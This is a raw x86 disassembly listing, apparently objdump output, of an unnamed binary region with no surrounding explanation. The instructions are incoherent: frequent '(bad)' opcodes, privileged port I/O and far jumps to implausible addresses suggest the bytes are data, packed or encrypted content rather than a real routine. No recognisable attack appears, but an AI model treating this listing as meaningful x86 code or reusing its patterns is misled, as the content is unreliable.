  41767f:	jp     0x417652
  417681:	dec    eax
  417682:	enter  0x14dc,0xba
  417686:	ss pop ebp
  417688:	xchg   esp,eax
  417689:	and    esi,DWORD PTR [eax+0x47]
  41768c:	das    
  41768d:	mov    al,ds:0xa12cbf64
  417692:	pop    esp
  417693:	or     ah,BYTE PTR [edi]
  417695:	xor    eax,0xb7ac5d55
  41769a:	(bad)  
  41769b:	repnz lods eax,DWORD PTR ds:[esi]
  41769d:	jg     0x417660
  41769f:	cdq    
  4176a0:	add    BYTE PTR [eax],bl
  4176a2:	loop   0x417636
  4176a4:	xchg   esi,eax
  4176a5:	(bad)  
  4176a6:	nop
  4176a7:	jg     0x417633
  4176a9:	idiv   BYTE PTR [ebp+0xb]
  4176ac:	pushf  
  4176ad:	ds adc bl,al
  4176b0:	cli    
  4176b1:	mov    cl,0xa1
  4176b3:	stos   DWORD PTR es:[edi],eax
  4176b4:	adc    ebp,DWORD PTR [ebx-0x1ba74cd8]
  4176ba:	loopne 0x4176ec
  4176bc:	mov    ah,0x13
  4176be:	dec    ecx
  4176bf:	and    DWORD PTR [ebp-0x38],edx
  4176c2:	sub    BYTE PTR [ebp-0x76],ch
  4176c5:	lods   eax,DWORD PTR ds:[esi]
  4176c6:	adc    bh,BYTE PTR [eax+ebp*1+0x26]
  4176ca:	sbb    BYTE PTR [esi+0x2d],bl
  4176cd:	pushf  
  4176ce:	sti    
  4176cf:	fstp   TBYTE PTR [ebx+0x4d859ed1]
  4176d5:	dec    ebx
  4176d6:	or     DWORD PTR [bx+0xa0c],esi
  4176db:	sar    BYTE PTR [edx-0x29aab568],cl
  4176e1:	mov    eax,0x37688184
  4176e6:	js     0x417720
  4176e8:	inc    ebx
  4176e9:	pop    esp
  4176ea:	jbe    0x417716
  4176ec:	add    eax,DWORD PTR [ebx+0x4a]
  4176ef:	push   es
  4176f0:	and    BYTE PTR [ecx+0x75],0xc3
  4176f4:	push   ebx
  4176f5:	and    ebx,esp
  4176f7:	inc    edx
  4176f8:	cmp    al,0xe1
  4176fa:	add    BYTE PTR [ebp-0x9],ah
  4176fd:	xlat   BYTE PTR ds:[ebx]
  4176fe:	dec    eax
  4176ff:	cs das 
  417701:	mov    BYTE PTR [ebx+edi*4],bh
  417704:	dec    edx
  417705:	xor    bl,BYTE PTR [ecx+0x2f]
  417708:	out    0xba,al
  41770a:	lahf   
  41770b:	fsub   DWORD PTR [ebx-0x549c14f1]
  417711:	out    dx,eax
  417712:	pop    es
  417713:	inc    esp
  417714:	pop    es
  417715:	les    edx,FWORD PTR [ebp-0x7e]
  417718:	cli    
  417719:	inc    esp
  41771a:	cmp    al,0xb8
  41771c:	into   
  41771d:	xchg   ebp,eax
  41771e:	cwde   
  41771f:	ja     0x4176a9
  417721:	or     DWORD PTR [ebx-0x3959abcc],ebx
  417727:	mov    dl,0x7d
  417729:	cmc    
  41772a:	aam    0x91
  41772c:	xor    BYTE PTR [edi+0x457ac1f5],cl
  417732:	popa   
  417733:	dec    esi
  417734:	pushf  
  417735:	in     al,dx
  417736:	sbb    al,BYTE PTR [edx]
  417738:	cmp    BYTE PTR [ebx+eiz*2],bh
  41773b:	test   BYTE PTR [esi+0x5c],0x1b
  41773f:	and    al,0x9f
  417741:	repz clc 
  417743:	sbb    bl,bl
  417745:	pop    ecx
  417746:	pop    ss
  417747:	mov    eax,DWORD PTR [eax]
  417749:	jmp    FWORD PTR [esi+0x10]
  41774c:	fisub  DWORD PTR ds:0xbe416f11
  417752:	or     eax,0x37c5a9af
  417757:	or     cl,BYTE PTR [ebx-0x796de68b]
  41775d:	pushf  
  41775e:	and    ch,BYTE PTR [esi-0x46]
  417761:	gs push edx
  417763:	pop    ebp
  417764:	rol    DWORD PTR [edx-0x2017ee7c],0x16
  41776b:	cli    
  41776c:	scas   al,BYTE PTR es:[edi]
  41776d:	mov    eax,ebp
  41776f:	inc    esi
  417770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417771:	test   eax,0xebe5f970
  417776:	jo     0x41771e
  417778:	mov    cl,0x4
  41777a:	jnp    0x4177a4
  41777c:	loopne 0x4177f9
  41777e:	dec    ecx
  41777f:	jp     0x4177e6
  417781:	(bad)  
  417782:	jecxz  0x417711
  417784:	mov    WORD PTR [eax+ebx*2-0x40c6f28],?
  41778b:	adc    ch,bl
  41778d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41778e:	push   edx
  41778f:	imul   esp,DWORD PTR [eax],0x6
  417792:	jecxz  0x417760
  417794:	das    
  417795:	repz sub ebp,ebx
  417798:	add    ebx,DWORD PTR [edi*2-0x55153746]
  41779f:	cld    
  4177a0:	mov    cs,WORD PTR [esi-0x14ff3679]
  4177a6:	push   ebx
  4177a7:	(bad)  
  4177a8:	xchg   ecx,eax
  4177a9:	mov    ebp,DWORD PTR [edx-0x23]
  4177ac:	xchg   esi,eax
  4177ad:	ins    DWORD PTR es:[edi],dx
  4177ae:	arpl   WORD PTR [edx+0x1577a649],sp
  4177b4:	ror    DWORD PTR ds:0x392f4cf1,cl
  4177ba:	sbb    ebx,DWORD PTR [ebp+ebx*2+0x64]
  4177be:	jb     0x4177c9
  4177c0:	xor    eax,0xf091eddb
  4177c5:	jae    0x4177b0
  4177c7:	and    BYTE PTR [edx+0x59fb644e],0x42
  4177ce:	xor    eax,0x1e91c7ff
  4177d3:	push   esp
  4177d4:	popf   
  4177d5:	dec    ebx
  4177d6:	shr    ebx,1
  4177d8:	sbb    al,0xc9
  4177da:	sub    DWORD PTR ss:[ecx],edx
  4177dd:	sar    BYTE PTR [eax],cl
  4177df:	lds    ebx,FWORD PTR ds:0x3a4dc944
  4177e5:	dec    ebx
  4177e6:	aas    
  4177e7:	ins    DWORD PTR es:[edi],dx
  4177e8:	push   edx
  4177e9:	or     ecx,DWORD PTR [eax+0x35]
  4177ec:	fdiv   DWORD PTR [ebp+0x3b435f2]
  4177f2:	test   bl,al
  4177f4:	adc    DWORD PTR [edi-0xa],eax
  4177f7:	clc    
  4177f8:	push   edx
  4177f9:	out    dx,al
  4177fa:	xchg   edx,eax
  4177fb:	in     al,dx
  4177fc:	ror    BYTE PTR [ecx-0x32823492],0xc
  417803:	sub    eax,0x1d1c5465
  417808:	sti    
  417809:	mov    ecx,0x8c43c21
  41780e:	fs dec ecx
  417810:	loope  0x417888
  417812:	cli    
  417813:	outs   dx,BYTE PTR ds:[esi]
  417814:	jmp    0x4177df
  417816:	sbb    DWORD PTR [edi+edx*2],edi
  417819:	repnz aad 0x2c
  41781c:	ret    0x2d40
  41781f:	jge    0x4177a1
  417821:	inc    edx
  417822:	and    edx,edi
  417824:	int    0x66
  417826:	js     0x4177b4
  417828:	gs mov ebx,0xbc30e8e7
  41782e:	fdivr  QWORD PTR [ecx+0x4f665ac6]
  417834:	mov    dl,BYTE PTR [esi-0xa4c89c8]
  41783a:	neg    DWORD PTR [edx]
  41783c:	dec    esi
  41783d:	out    dx,eax
  41783e:	call   0x2df9:0xb3ab4a11
  417845:	pop    ecx
  417846:	cmp    DWORD PTR [bx],eax
  417849:	jge    0x417839
  41784b:	dec    esi
  41784c:	repz cmp eax,0xf9daee73
  417852:	test   BYTE PTR [ecx-0x2dbf122f],0x27
  417859:	jecxz  0x41781e
  41785b:	mov    al,0x3b
  41785d:	mov    WORD PTR [esi-0x40],?
  417860:	mov    bh,0xdd
  417862:	adc    al,0x74
  417864:	mov    ah,0xc2
  417866:	jle    0x417819
  417868:	loope  0x41788a
  41786a:	sbb    DWORD PTR [ecx],esp
  41786c:	fnsave [edx+ecx*8-0xf]
  417870:	daa    
  417871:	or     BYTE PTR [ecx-0x42],ah
  417874:	popa   
  417875:	mov    ebx,0x392c7a50
  41787a:	jmp    0x31476de8
  41787f:	push   edx
  417880:	mov    ds:0x8a7cc363,al
  417885:	push   ss
  417886:	mov    al,0xca
  417888:	jmp    0x238ea1ca
  41788d:	mov    ?,WORD PTR [eax-0x21]
  417890:	mov    esi,0xe40fd594
  417895:	cmp    DWORD PTR [ecx+0x5e],ecx
  417898:	leave  
  417899:	out    0x39,eax
  41789b:	jg     0x41791b
  41789d:	xchg   edi,eax
  41789e:	imul   eax,DWORD PTR [edi+0xd1a63fc],0xe11dcebc
  4178a8:	stc    
  4178a9:	and    bl,BYTE PTR [eax+ecx*1+0x46]
  4178ad:	dec    ecx
  4178ae:	mov    ecx,0x6ec78e02
  4178b3:	mov    al,ds:0xf13c308a
  4178b8:	cli    
  4178b9:	pop    ebx
  4178ba:	xor    DWORD PTR [edx],ecx
  4178bc:	pop    esi
  4178bd:	out    0x95,al
  4178bf:	aam    0x3c
  4178c1:	xor    cl,BYTE PTR [ebx]
  4178c3:	inc    ecx
  4178c4:	jnp    0x4178e5
  4178c6:	lahf   
  4178c7:	add    al,0x25
  4178c9:	mov    al,0x53
  4178cb:	cmc    
  4178cc:	jmp    0x949:0x8cac9b69
  4178d3:	or     DWORD PTR [esi],ebx
  4178d5:	lds    edi,FWORD PTR [edi+0x30]
  4178d8:	inc    ecx
  4178d9:	cmp    eax,0x9c8a5722
  4178de:	xlat   BYTE PTR ds:[ebx]
  4178df:	dec    esi
  4178e0:	dec    edi
  4178e1:	ret    
  4178e2:	test   bl,0x5b
  4178e5:	test   BYTE PTR ds:0xfa5abd58,dh
  4178eb:	pop    ds
  4178ec:	lea    ecx,[edx+0x56f809ba]
  4178f2:	inc    ebp
  4178f3:	int3   
  4178f4:	fpatan 
  4178f6:	inc    esp
  4178f7:	mov    ecx,0x79573ac5
  4178fc:	leave  
  4178fd:	es xchg edx,eax
  4178ff:	dec    ebp
  417900:	pop    es
  417901:	in     eax,0xd5
  417903:	mov    dl,BYTE PTR [esi-0x2b428399]
  417909:	push   edx
  41790a:	xchg   DWORD PTR [edx+0x56c287a5],eax
  417910:	mov    ebx,0xdaa89b2d
  417915:	xchg   BYTE PTR [edi-0x68],al
  417918:	dec    esi
  417919:	repz adc BYTE PTR [eax+0x6ad1983e],0x9
  417921:	add    dl,BYTE PTR [edx+0x69]
  417924:	aas    
  417925:	sub    edx,esi
  417927:	jp     0x41797d
  417929:	mov    dh,0x4c
  41792b:	imul   ebx,eax,0x678ed8e
  417931:	inc    ebp
  417932:	or     ebp,edi
  417934:	ficom  DWORD PTR [ebx-0x61]
  417937:	jo     0x41797f
  417939:	jns    0x417942
  41793b:	(bad)  
  41793c:	out    dx,eax
  41793d:	mov    ebx,0x260cdabb
  417942:	add    BYTE PTR [ecx+esi*2-0x76],dh
  417946:	adc    edx,0xffffff90
  417949:	lahf   
  41794a:	data16 in al,dx
  41794c:	dec    esp
  41794d:	mov    ebx,0x3c36e416
  417952:	mov    bl,0x97
  417954:	stos   DWORD PTR es:[edi],eax
  417955:	add    DWORD PTR [eax+eax*2],ecx
  417958:	fst    QWORD PTR [ecx-0x383c533c]
  41795e:	cmovge edx,DWORD PTR [edi+0xb]
  417962:	imul   eax,DWORD PTR [edi-0x4185709a],0x373512af
  41796c:	das    
  41796d:	clc    
  41796e:	dec    bx
  417970:	adc    DWORD PTR [esi+0x393a759e],esp
  417976:	or     BYTE PTR [eax+0x2e],ch
  417979:	dec    edi
  41797a:	xchg   ebx,eax
  41797b:	and    BYTE PTR [ebx],bl
  41797d:	pop    ss
  41797e:	add    DWORD PTR [edx],eax
  417980:	lods   al,BYTE PTR ds:[esi]
  417981:	mov    ebp,0x9e35a15f
  417986:	arpl   bp,di
  417988:	cmp    eax,0x1d7e716f
  41798d:	push   eax
  41798e:	sbb    eax,esi
  417990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417991:	mov    dl,0x88
  417993:	push   esp
  417994:	out    0xb6,eax
  417996:	in     al,dx
  417997:	dec    edx
  417998:	cmp    ecx,DWORD PTR [ecx+edx*2]
  41799b:	sbb    bh,cl
  41799d:	fldcw  WORD PTR [ebp-0x2f]
  4179a0:	popf   
  4179a1:	pop    edx
  4179a2:	retf   
  4179a3:	sub    BYTE PTR [edi],dh
  4179a5:	loope  0x417a05
  4179a7:	and    eax,0x121c1fc6
  4179ac:	adc    ecx,edi
  4179ae:	scas   eax,DWORD PTR es:[edi]
  4179af:	frndint 
  4179b1:	stos   BYTE PTR es:[edi],al
  4179b2:	aas    
  4179b3:	mov    ch,dh
  4179b5:	mov    dl,0x48
  4179b7:	int3   
  4179b8:	repz push ebx
  4179ba:	adc    cl,BYTE PTR [eax]
  4179bc:	(bad)  
  4179bd:	aam    0x32
  4179bf:	cmovns edi,edx
  4179c2:	sahf   
  4179c3:	push   dx
  4179c5:	pop    ebx
  4179c6:	mov    dh,0x28
  4179c8:	out    0xef,eax
  4179ca:	mov    eax,ds:0x1bf3935e
  4179cf:	nop
  4179d0:	inc    ebx
  4179d1:	push   es
  4179d2:	pop    ebp
  4179d3:	jmp    0x41798f
  4179d5:	test   BYTE PTR [esi],0xe3
  4179d8:	pop    esp
  4179d9:	mov    ebx,0x14e7a188
  4179de:	xor    DWORD PTR ds:0x72ff6360,esp
  4179e4:	xchg   esi,eax
  4179e5:	mov    dh,ch
  4179e7:	(bad)
  4179ea:	je     0x4179d6
  4179ec:	ja     0x417a15
  4179ee:	mov    al,0xc6
  4179f0:	fdiv   st(4),st
  4179f2:	aad    0x9a
  4179f4:	lea    ebp,[ecx+0x68]
  4179f7:	scas   al,BYTE PTR es:[edi]
  4179f8:	retf   
  4179f9:	scas   al,BYTE PTR es:[edi]
  4179fa:	jmp    0x4179af
  4179fc:	jo     0x417a79
  4179fe:	rcr    BYTE PTR [ecx-0x7e],cl
  417a01:	out    dx,al
  417a02:	add    ch,BYTE PTR [edi]
  417a04:	and    al,0x15
  417a06:	adc    al,0xa4
  417a08:	push   edi
  417a09:	jmp    0x206bdf68
  417a0e:	aaa    
  417a0f:	aaa    
  417a10:	or     DWORD PTR [esi+0x3d],ebx
  417a13:	xor    ebp,DWORD PTR [ebx-0x2438169]
  417a19:	js     0x417a1b
  417a1b:	mov    al,0x87
  417a1d:	adc    ch,al
  417a1f:	mov    dh,0x2a
  417a21:	mov    ebp,0xfbdc0d86
  417a26:	xchg   esp,eax
  417a27:	rcr    BYTE PTR [ecx-0xe9297d],cl
  417a2d:	mov    al,ds:0xe424703b
  417a32:	test   al,0xc0
  417a34:	mov    bh,0xfa
  417a36:	mov    bh,0x86
  417a38:	add    al,0xd0
  417a3a:	ja     0x417a69
  417a3c:	jno    0x417a16
  417a3e:	scas   al,BYTE PTR es:[edi]
  417a3f:	gs adc al,0xe0
  417a42:	iret   
  417a43:	inc    ebp
  417a44:	add    esi,DWORD PTR [ebp-0x7]
  417a47:	aaa    
  417a48:	or     DWORD PTR [ebp+0x39],ebp
  417a4b:	xchg   BYTE PTR [ebx-0x57cb239a],dl
  417a51:	push   0xa5dab4ab
  417a56:	cwde   
  417a57:	push   ss
  417a58:	imul   esi,DWORD PTR [ebp+0x24],0x98659b43
  417a5f:	xchg   ebx,eax
  417a60:	sub    ebx,DWORD PTR [esi-0x7b2f0980]
  417a66:	scas   al,BYTE PTR es:[edi]
  417a67:	add    ebx,DWORD PTR [esi-0x5a74c493]
  417a6d:	adc    al,0xbe
  417a6f:	popf   
  417a70:	pushf  
  417a71:	adc    eax,0x8b95a55a
  417a76:	push   ss
  417a77:	test   DWORD PTR es:[ecx-0x6ae926ef],ebx
  417a7e:	ja     0x417a9f
  417a80:	outs   dx,BYTE PTR ds:[esi]
  417a81:	mov    bh,BYTE PTR [edx]
  417a83:	pop    ebp
  417a84:	stos   BYTE PTR es:[edi],al
  417a85:	xchg   ecx,eax
  417a86:	daa    
  417a87:	lods   al,BYTE PTR ds:[esi]
  417a88:	pushf  
  417a89:	cmp    al,0x92
  417a8b:	sbb    DWORD PTR [ebx-0xbebbd67],ebx
  417a91:	jne    0x417ab4
  417a93:	dec    edx
  417a94:	mov    ds:0x97c0ffd6,eax
  417a99:	and    al,0xba
  417a9b:	push   cs
  417a9c:	or     DWORD PTR [ebp-0x64],edi
  417a9f:	mov    bl,0x8e
  417aa1:	pop    eax
  417aa2:	mov    eax,0x5d68362
  417aa7:	and    eax,0x9bcd1f4
  417aac:	repz xor eax,0x80bf7d4b
  417ab2:	lods   eax,DWORD PTR ds:[esi]
  417ab3:	adc    BYTE PTR [ebx],bh
  417ab5:	jb     0x417a4a
  417ab7:	pop    esp
  417ab8:	pop    ebx
  417ab9:	nop
  417aba:	inc    esp
  417abb:	pop    eax
  417abc:	leave  
  417abd:	lock push esi
  417abf:	inc    esi
  417ac0:	push   eax
  417ac1:	sbb    al,0x28
  417ac3:	pop    esp
  417ac4:	stos   DWORD PTR es:[edi],eax
  417ac5:	mov    ch,0x3b
  417ac7:	pop    ebx
  417ac8:	fs pop ss
  417aca:	pop    eax
  417acb:	retf   
  417acc:	cli    
  417acd:	in     eax,dx
  417ace:	push   esi
  417acf:	sti    
  417ad0:	or     al,0x62
  417ad2:	jl     0x417abc
  417ad4:	adc    esi,edx
  417ad6:	pop    ebp
  417ad7:	xor    al,0x69
  417ad9:	inc    esp
  417ada:	and    esp,ebp
  417adc:	push   eax
  417add:	push   0xffffffc3
  417adf:	sar    DWORD PTR [ecx-0x6a949b17],cl
  417ae5:	mov    ebp,0xf5fa7f3e
  417aea:	and    bh,bh
  417aec:	dec    esi
  417aed:	mov    edx,0x3953fc90
  417af2:	dec    ebp
  417af3:	cwde   
  417af4:	lods   eax,DWORD PTR ds:[esi]
  417af5:	loope  0x417b52
  417af7:	daa    
  417af8:	lock jo 0x417adb
  417afb:	add    edx,DWORD PTR [esi-0x3f0df0d7]
  417b01:	mov    DWORD PTR [esi-0x1d1a6853],eax
  417b07:	out    dx,eax
  417b08:	cli    
  417b09:	sbb    ebp,DWORD PTR [esi+eiz*8-0x44]
  417b0d:	(bad)  
  417b0e:	cmp    dl,BYTE PTR [edi+ebp*8+0x23]
  417b12:	shl    edi,1
  417b14:	mov    ebx,0xa573ac27
  417b19:	dec    eax
  417b1a:	jnp    0x417b2b
  417b1c:	ins    BYTE PTR es:[edi],dx
  417b1d:	mov    dl,0x8a
  417b1f:	jo     0x417b41
  417b21:	mov    dl,0xf6
  417b23:	sti    
  417b24:	and    ecx,DWORD PTR [eax+esi*8]
  417b27:	dec    edi
  417b28:	pop    ds
  417b29:	adc    al,0x48
  417b2b:	mov    esp,0xef8d975b
  417b30:	fidiv  DWORD PTR [ecx]
  417b32:	sub    al,0x83
  417b34:	fwait
  417b35:	stos   DWORD PTR es:[edi],eax
  417b36:	sbb    dl,ch
  417b38:	enter  0x516,0xf
  417b3c:	mov    ebp,0x395f0011
  417b41:	xor    eax,0xd3241cc7
  417b46:	bound  edi,QWORD PTR [ecx]
  417b48:	aam    0x5d
  417b4a:	mov    edx,0x3febe3ea
  417b4f:	mov    WORD PTR [ebx],ss
  417b51:	popf   
  417b52:	xor    dh,cl
  417b54:	call   0x8cc82835
  417b59:	popa   
  417b5a:	xchg   DWORD PTR [edi],edi
  417b5c:	adc    eax,DWORD PTR [edx+ecx*8-0x7049a667]
  417b63:	fidiv  DWORD PTR [edi+ebx*8+0x66]
  417b67:	jbe    0x417b9d
  417b69:	dec    edi
  417b6a:	stos   BYTE PTR es:[edi],al
  417b6b:	xchg   BYTE PTR [ebp-0x5298b917],cl
  417b71:	adc    eax,0x106cc53
  417b76:	pop    ebx
  417b77:	enter  0xc871,0xb1
  417b7b:	sbb    eax,0x3d118c11
  417b80:	sbb    esi,DWORD PTR [ebp-0x5c]
  417b83:	cdq    
  417b84:	push   DWORD PTR [ebx]
  417b86:	cmp    eax,0x6eb0238f
  417b8b:	jl     0x417bf8
  417b8d:	pop    esp
  417b8e:	and    dl,bl
  417b90:	and    DWORD PTR [edi+0x172897ae],ecx
  417b96:	and    eax,0x6ce2e821
  417b9b:	dec    ebp
  417b9c:	not    BYTE PTR [ebx-0x32491dbb]
  417ba2:	xlat   BYTE PTR ds:[ebx]
  417ba3:	pop    edi
  417ba4:	mov    esp,0xa414dfbe
  417ba9:	xchg   ebp,eax
  417baa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bab:	sbb    al,0xd2
  417bad:	dec    ebp
  417bae:	pop    edx
  417baf:	out    0x34,al
  417bb1:	ins    DWORD PTR es:[edi],dx
  417bb2:	jge    0x417ba2
  417bb4:	pop    eax
  417bb5:	dec    ebp
  417bb6:	mov    ds:0xb1d6a5ac,al
  417bbb:	into   
  417bbc:	pop    esp
  417bbd:	daa    
  417bbe:	mov    eax,0x6cd7f596
  417bc3:	leave  
  417bc4:	mov    eax,ds:0xe7879681
  417bc9:	int3   
  417bca:	or     ah,BYTE PTR ds:0x1eb5dc0b
  417bd0:	(bad)  
  417bd1:	std    
  417bd2:	out    dx,al
  417bd3:	int    0xe9
  417bd5:	sub    eax,DWORD PTR [ebx-0x63885298]
  417bdb:	or     dh,BYTE PTR [esi+0x575410f1]
  417be1:	xor    cl,BYTE PTR [esp+esi*2]
  417be4:	cmp    dl,BYTE PTR [edi+0x63]
  417be7:	dec    esi
  417be8:	ja     0x417c21
  417bea:	mov    cl,0xa1
  417bec:	dec    ecx
  417bed:	jl     0x417b70
  417bef:	fcomp  DWORD PTR [ebx]
  417bf1:	int3   
  417bf2:	push   ss
  417bf3:	mov    ch,0x6d
  417bf5:	scas   al,BYTE PTR es:[edi]
  417bf6:	and    al,0x6b
  417bf8:	jo     0x417bcf
  417bfa:	inc    eax
  417bfb:	sub    esp,DWORD PTR [edx-0x29]
  417bfe:	xchg   DWORD PTR [ebx+0x45c09726],edx
  417c04:	loopne 0x417be3
  417c06:	mov    ds:0x9820c330,al
  417c0b:	cdq    
  417c0c:	push   eax
  417c0d:	xor    BYTE PTR [ecx],0x52
  417c10:	fistp  QWORD PTR [ecx]
  417c12:	or     al,BYTE PTR [ecx-0x2a65b90b]
  417c18:	mov    dl,0x96
  417c1a:	daa    
  417c1b:	das    
  417c1c:	add    dh,BYTE PTR [edx-0xfdc2a1b]
  417c22:	popa   
  417c23:	outs   dx,DWORD PTR ds:[esi]
  417c24:	les    ebp,FWORD PTR [ebp+0x54]
  417c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c28:	ret    0x9293
  417c2b:	mov    DWORD PTR [edx-0x15d26870],ecx
  417c31:	adc    edi,DWORD PTR [edi-0x54cb9a65]
  417c37:	repz cld 
  417c39:	in     al,dx
  417c3a:	scas   al,BYTE PTR es:[edi]
  417c3b:	fs mov ebx,0x70590ad3
  417c41:	pop    ss
  417c42:	jne    0x417c2a
  417c44:	mov    al,0x3f
  417c46:	fcmovu st,st(4)
  417c48:	sub    al,0x44
  417c4a:	adc    al,0x48
  417c4c:	xchg   edi,eax
  417c4d:	jecxz  0x417cb2
  417c4f:	inc    ebp
  417c50:	fs pusha 
  417c52:	ins    BYTE PTR es:[edi],dx
  417c53:	and    al,0xf3
  417c55:	imul   esp,DWORD PTR [ebp+0x20],0xffffff9a
  417c59:	test   DWORD PTR [ecx-0x6b312a0],edi
  417c5f:	mov    BYTE PTR [edi+0xb],bh
  417c62:	ins    DWORD PTR es:[edi],dx
  417c63:	ss in  eax,0x60
  417c66:	push   ebp
  417c67:	out    0x91,al
  417c69:	and    cl,BYTE PTR [esi+edi*2]
  417c6c:	inc    ebx
  417c6d:	cmp    BYTE PTR [edi+0x306e4bf5],ah
  417c73:	test   al,0xe4
  417c75:	inc    edx
  417c76:	stos   BYTE PTR es:[edi],al
  417c77:	push   ecx
  417c78:	pop    ebp
  417c79:	mov    eax,ds:0xb1cc1d64
  417c7e:	mov    bh,0x1a
  417c80:	cmp    edi,DWORD PTR [edi-0x741068cb]
  417c86:	xchg   ebx,eax
  417c87:	cmp    eax,0xf684859
  417c8c:	xor    edi,DWORD PTR [edx-0x50]
  417c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c90:	dec    ecx
  417c91:	(bad)
  417c96:	test   BYTE PTR [edi],0x74
  417c99:	repnz cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417c9c:	xor    eax,DWORD PTR [edi-0x9]
  417c9f:	lods   al,BYTE PTR ds:[esi]
  417ca0:	and    BYTE PTR [ebp+0x7f],bh
  417ca3:	mov    bl,BYTE PTR [ebx]
  417ca5:	add    DWORD PTR [edx+0x54],esp
  417ca8:	shl    DWORD PTR ds:0xfc81bfe3,0x6b
  417caf:	sar    dl,cl
  417cb1:	xor    ch,al
  417cb3:	sbb    cl,BYTE PTR [esi]
  417cb5:	cdq    
  417cb6:	push   ss
  417cb7:	cmp    ebx,DWORD PTR [ebx-0x52c26a34]
  417cbd:	jnp    0x417c5d
  417cbf:	sbb    DWORD PTR ds:0xbf626ee0,0x30411697
  417cc9:	xchg   edx,eax
  417cca:	fs loopne 0x417d2c
  417ccd:	add    edi,DWORD PTR [edi+esi*8-0x7b]
  417cd1:	ror    DWORD PTR [ebx-0x6b],1
  417cd4:	sbb    al,0xb8
  417cd6:	mov    esp,0x6d1f1121
  417cdb:	pop    edx
  417cdc:	fadd   QWORD PTR [ecx-0x37414edb]
  417ce2:	push   ebp
  417ce3:	jmp    0xe6d77748
  417ce8:	sbb    DWORD PTR [esi+0x79],eax
  417ceb:	dec    edx
  417cec:	shl    DWORD PTR [ebx],1
  417cee:	dec    edi
  417cef:	inc    ecx
  417cf0:	ss mov edx,0x3ac1399a
  417cf6:	test   BYTE PTR [eiz*2-0x57a4d898],al
  417cfd:	jmp    0x22f5:0x3eb63c5f
  417d04:	jbe    0x417cea
  417d06:	out    0x78,eax
  417d08:	(bad)  
  417d09:	sbb    cl,BYTE PTR [esi]
  417d0b:	shr    BYTE PTR [esi-0x2c511671],0x33
  417d12:	mov    bl,BYTE PTR [ecx+edi*2-0x5b]
  417d16:	stos   BYTE PTR es:[edi],al
  417d17:	aaa    
  417d18:	mov    ss,edx
  417d1a:	push   ebx
  417d1b:	dec    esi
  417d1c:	fimul  DWORD PTR fs:[esi-0x57]
  417d20:	xchg   esi,eax
  417d21:	dec    esp
  417d22:	mov    ah,0x14
  417d24:	cmc    
  417d25:	mov    dh,0x36
  417d27:	or     edx,DWORD PTR [esi-0x240dab56]
  417d2d:	dec    ebx
  417d2e:	sbb    dh,cl
  417d30:	push   ds
  417d31:	pop    ebx
  417d32:	jmp    0x417cb9
  417d34:	mov    al,ds:0xa51fa81d
  417d39:	bound  ebx,QWORD PTR [esi+0x1b]
  417d3c:	jmp    0x417d1c
  417d3e:	(bad)  
  417d3f:	ins    BYTE PTR es:[edi],dx
  417d40:	test   al,0xba
  417d42:	sub    ah,BYTE PTR [ecx+0x6f9b9c1b]
  417d48:	test   DWORD PTR [ebp-0xf4a7f03],ecx
  417d4e:	outs   dx,DWORD PTR ds:[esi]
  417d4f:	scas   eax,DWORD PTR es:[edi]
  417d50:	call   0xb7a7:0x6c664f7d
  417d57:	sub    BYTE PTR [ebx],al
  417d59:	pop    ecx
  417d5a:	push   es
  417d5b:	cmp    al,BYTE PTR [edx+edi*8+0x13fdb013]
  417d62:	or     al,0xd1
  417d64:	mov    BYTE PTR [esi-0x19df5354],bl
  417d6a:	xchg   DWORD PTR [ebx],eax
  417d6c:	and    esp,ecx
  417d6e:	dec    esi
  417d6f:	(bad)  
  417d71:	ror    DWORD PTR [eax+0x71],0xc7
  417d75:	mov    al,0x25
  417d77:	enter  0x1a9f,0xac
  417d7b:	jl     0x417da3
  417d7d:	psllw  mm3,0xc5
  417d81:	or     al,0x1b
  417d83:	jle    0x417d78
  417d85:	adc    DWORD PTR [ebp-0x12b1db3e],edx
  417d8b:	outs   dx,BYTE PTR ds:[esi]
  417d8c:	push   es
  417d8d:	pop    edi
  417d8e:	aad    0xbf
  417d90:	iret   
  417d91:	shl    BYTE PTR [eax-0x3bf0ddf6],cl
  417d97:	pop    esi
  417d98:	xor    al,0xbc
  417d9a:	loop   0x417d6f
  417d9c:	enter  0x356d,0x1
  417da0:	shl    BYTE PTR [ecx-0xf],1
  417da3:	cmc    
  417da4:	call   0xba8e:0x9f62bea
  417dab:	test   eax,0xf9c587fb
  417db0:	ja     0x417e22
  417db2:	aas    
  417db3:	or     esi,ebx
  417db5:	mov    edx,0xdff95d24
  417dba:	je     0x417dc0
  417dbc:	pop    ecx
  417dbd:	pop    ebx
  417dbe:	rcr    BYTE PTR [ecx-0x5a],cl
  417dc1:	sbb    ah,BYTE PTR [edx-0x1a8ba2a]
  417dc7:	std    
  417dc8:	dec    edi
  417dc9:	mov    dh,0x76
  417dcb:	idiv   DWORD PTR ds:[edx+0x38bd1567]
  417dd2:	xchg   esp,eax
  417dd3:	mov    esi,0x6e85382b
  417dd8:	xor    edi,DWORD PTR [ebx+0x58830c9e]
  417dde:	aaa    
  417ddf:	jnp    0x417da6
  417de1:	sub    BYTE PTR [edi-0x78],dh
  417de4:	xchg   BYTE PTR [edi],dl
  417de6:	lock xchg edi,eax
  417de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417de9:	xchg   BYTE PTR [esp+edi*4+0x270dd5d8],ch
  417df0:	sbb    DWORD PTR [edi-0x74675419],eax
  417df6:	pop    ds
  417df7:	std    
  417df8:	sbb    cl,ah
  417dfa:	sti    
  417dfb:	(bad)  
  417dfc:	and    DWORD PTR [ecx],eax
  417dfe:	mov    dl,0x84
  417e00:	jbe    0x417e7d
  417e02:	dec    ebp
  417e03:	add    ecx,ebp
  417e05:	jns    0x417de3
  417e07:	and    ch,BYTE PTR [esi+0x66e524ce]
  417e0d:	fld    QWORD PTR [edx-0x55]
  417e10:	retf   
  417e11:	mov    cl,0x94
  417e13:	xchg   edi,eax
  417e14:	pop    ss
  417e15:	sbb    DWORD PTR [edi-0x7d803b70],ebx
  417e1b:	lods   eax,DWORD PTR ds:[esi]
  417e1c:	ins    DWORD PTR es:[edi],dx
  417e1d:	push   esp
